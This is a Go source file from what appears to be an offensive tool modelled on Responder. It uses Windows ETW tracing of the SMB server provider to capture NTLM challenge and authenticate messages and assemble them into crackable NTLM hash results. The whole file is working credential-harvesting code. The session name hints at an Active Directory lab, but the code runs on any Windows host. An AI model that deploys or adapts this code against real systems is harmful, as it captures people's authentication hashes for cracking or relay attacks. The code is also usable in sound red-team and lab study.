//go:build windows

package responder

import (
	"context"
	"encoding/hex"
	"fmt"

	"github.com/0xrawsec/golang-etw/etw"
)

func (p *Producer) GatherSMBHashes(ctx context.Context) error {
	s := etw.NewRealTimeSession("goad-session-smb")
	defer s.Stop()

	provider, err := etw.ParseProvider("Microsoft-Windows-SMBServer")
	if err != nil {
		return err
	}
	provider.Filter = []uint16{40000}
	if err := s.EnableProvider(provider); err != nil {
		return fmt.Errorf("problem enabling provider %v: %v", provider, err)
	}

	c := etw.NewRealTimeConsumer(ctx).FromSessions(s)
	defer c.Stop()

	go func() {
		var lastChallenge []byte
		for e := range c.Events {
			pds, found := e.GetPropertyString("PacketData")
			if !found {
				continue
			}

			pd, err := hex.DecodeString(pds[2:])
			if err != nil {
				continue
			}

			ok := IsNTLM(pd)
			if !ok {
				continue
			}

			switch GetMessageType(pd) {
			case NtLmChallenge:
				lastChallenge = GetChallenge(pd)
			case NtLmAuthenticate:
				msg, err := NewNTLMResult(pd, lastChallenge)
				if err == nil {
					msg.GatheredFrom = SMB
					p.Results <- msg
					lastChallenge = nil
				} /*else {
					fmt.Println(err)
				}*/
			}
		}
	}()

	if err := c.Start(); err != nil {
		return err
	}

	<-ctx.Done()
	return nil
}
